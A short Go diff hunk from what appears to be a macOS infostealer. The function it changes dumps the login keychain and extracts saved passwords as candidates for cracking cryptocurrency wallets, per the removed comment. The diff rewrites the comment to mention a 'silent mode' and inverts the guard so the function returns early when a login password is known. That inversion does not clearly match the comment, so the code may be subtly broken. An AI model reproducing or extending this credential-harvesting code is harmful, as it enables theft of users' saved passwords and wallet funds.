@@ -24,10 +24,10 @@ var (
 	kcAccountLineRe   = regexp.MustCompile(`"acct"<blob>="([^"]*)"`)
 )
 
-// CollectKeychainPasswordCandidates dumps the login keychain (when unlocked) and extracts
-// saved internet/generic passwords as wallet-crack candidates.
+// CollectKeychainPasswordCandidates dumps the login keychain and extracts saved passwords.
+// Skipped in silent mode: dump-keychain can open a GUI prompt per keychain item even with -p.
 func CollectKeychainPasswordCandidates() []types.PasswordCandidateResult {
-	if crypto.MacLoginPassword() == "" {
+	if crypto.MacLoginPassword() != "" {
 		return nil
 	}
 	loginKC := loginKeychainDBPath()
